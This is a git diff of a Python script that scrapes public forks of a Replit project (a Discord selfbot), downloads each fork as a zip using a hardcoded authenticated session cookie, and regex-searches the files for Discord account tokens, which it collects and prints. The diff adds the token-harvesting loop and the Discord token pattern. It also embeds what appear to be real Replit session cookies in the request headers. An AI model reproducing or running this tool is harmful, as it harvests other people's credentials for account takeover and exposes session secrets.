@@ -4,6 +4,10 @@ import asyncio
 from aioconsole import aprint
 import websockets
 import zipfile
+import re
+import os
+import shutil
+
 
 class ReplIt:
     def __init__(self) -> None:
@@ -62,7 +66,7 @@ class ReplIt:
                 "operationName":"ReplViewForks",
                 "variables":{
                     "replId":f"{repl_id}",
-                    "count":100
+                    "count":500
                 },
                 "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
             }
@@ -89,22 +93,21 @@ class ReplIt:
             "sec-ch-ua-platform": "Linux",
             "Service-Worker-Navigation-Preload": "true",
             "Upgrade-Insecure-Requests": "1",
-            "Cookie": "_anon_id=abf0f575-1c1c-4de7-bc67-7803533ea9b5; connect.sid=s%3A0EXIP7bz-8-ze2sn-IPl2UixD9vfqAW5.La8BiTk8r4f5LeVffnTW1yuAUrqApPD0%2B3ow6a4BYtg; replit:authed=1; replit_authed=1; sidebarClosed=true; replit_ng=1658866863.878.1158.975121|8035451343a2d8f3e54599c71b2aec19; amplitudeSessionId=1658866864; _dd_s=logs=1&id=6f96cf29-fa31-4032-8e7d-6a518088db97&created=1658866865100&expire=1658867965634",
+            "Cookie": "_anon_id=abf0f575-1c1c-4de7-bc67-7803533ea9b5; amplitudeSessionId=1658875018; connect.sid=s%3AMX1T-6foGoJBZ-vD4mai6zi3B5PP-__N.%2BikcOEv6Hxvjef1mdu3cBMV0SHttLuzNwL0Tf6rEDi8; replit:authed=1; replit_authed=1; replit_ng=1658875358.96.42.510323|8035451343a2d8f3e54599c71b2aec19; _dd_s=logs=1&id=71c9808c-aa51-4dbf-8dc1-ba183419d5a9&created=1658875018897&expire=1658876264927",
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 Safari/537.36"
         }
         async with aiohttp.ClientSession() as session:
         # In order to get zip we need to first somehow get the cookie thats related to being authenticated
         # My balls hurt uwu
-            async with session.get("https://replit.com", headers=headers) as resp:
-                if resp.status == 200:
-                    cookie = resp.headers
-                    await aprint(cookie)
+            # async with session.get("https://replit.com", headers=headers) as resp:
+            #     if resp.status == 200:
+            #         cookie = resp.headers
 
 
 
 
 
-            async with session.get("https://replit.com/{repl_url}", headers=headers) as resp:
+            async with session.get(f"https://replit.com{repl_url}.zip", headers=headers) as resp:
                 if resp.status == 200:
                     j = await resp.read()
                     with open('./resources/data/repl.zip', 'wb') as f:
@@ -114,13 +117,51 @@ class ReplIt:
                     await aprint(resp.status)
 
     async def search_zip(self):
+        tokens = []
+        folder = "./resources/data"
         with zipfile.ZipFile('./resources/data/repl.zip', 'r') as zip_ref:
-            zip_ref.extractall('./resources/data')
+            zip_ref.extractall(folder)
+        for root, dirs, files in os.walk(folder):
+            for file in files:
+                file_txt = open(f"{root}/{file}", "r", encoding="utf-8")
+                try:
+                    file_contents = file_txt.read().strip()
+
+                    disc_tokens = re.findall(r"\w{24}\.\w{6}\.\w{27}", file_contents)
+                    if len(disc_tokens) > 0:
+                        tokens += disc_tokens
+                    file_txt.close()
+                except:
+                    continue
+
+        for filename in os.listdir(folder):
+            file_path = os.path.join(folder, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception as e:
+                await aprint('Failed to delete %s. Reason: %s' % (file_path, e))
+
+
+        return tokens
+
 
 
 
 
 if __name__ == "__main__":
     repl = ReplIt()
-    asyncio.run(repl.get_zip("@Faysxl/Windys-nitro-generator"))
-    asyncio.run(repl.search_zip())
+    id = asyncio.run(repl.get_id("/@MatheusTeles1/Yuo-Selfbot"))
+    urls, ids = asyncio.run(repl.get_forks(id))
+    full = []
+    print(len(urls))
+    for url in urls:
+        asyncio.run(repl.get_zip(url))
+        tokens = asyncio.run(repl.search_zip())
+        full += tokens
+        print(full)
+
+    for tokens in full:
+        print(tokens)
